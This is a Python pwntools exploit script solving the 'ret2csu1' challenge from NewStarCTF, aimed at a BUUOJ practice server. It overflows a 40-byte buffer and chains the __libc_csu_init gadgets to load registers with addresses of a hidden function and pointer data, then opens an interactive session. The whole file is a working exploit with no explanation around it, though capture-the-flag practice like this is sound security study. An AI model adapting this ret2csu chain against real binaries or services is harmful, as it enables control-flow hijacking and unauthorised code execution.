#[NewStarCTF 公开赛赛道]ret2csu1
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
elf=ELF('./pwn')
r=remote('node5.buuoj.cn',25052)
# r=process('./pwn')
csu_end=0x40072A
csu_front=0x400710
bin=0x4007BB
flag=0x601050  #用指针数组的地址
gift3=0x601068
main=0x400654
def csu(rbx,rbp,r12,r13,r14,r15):
    payload=b'a'*40
    payload+=p64(csu_end)
    payload+=p64(rbx)
    payload+=p64(rbp)
    payload+=p64(r12)
    payload+=p64(r13)
    payload+=p64(r14)
    payload+=p64(r15)
    payload+=p64(csu_front)
    print(len(payload))
    r.sendline(payload)
r.recvuntil(b'I hide some useful text in this elf.Remember to check it!')
# gdb.attach(r)
# pause()
csu(0,1,gift3,bin,flag,0)
print(f"lll:{r.recvline()}")
r.interactive()

